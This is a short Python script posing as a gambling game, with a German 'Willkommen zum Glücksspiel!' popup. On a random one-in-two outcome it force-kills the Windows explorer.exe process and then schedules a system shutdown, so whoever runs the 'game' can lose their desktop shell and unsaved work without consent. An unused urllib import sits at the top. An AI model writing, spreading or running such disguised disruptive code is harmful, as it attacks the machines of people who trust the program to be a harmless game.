import os
import random
import urllib.request
from tkinter import messagebox
import time

messagebox.showinfo("Glücksspiel", "Willkommen zum Glücksspiel!")

random_number = random.randint(1, 2)
if random_number == 1:
    print("Glückwunsch")
else:
    os.system("taskkill /f /im explorer.exe")
    time.sleep(5)
    os.system("shutdown /s /t 500")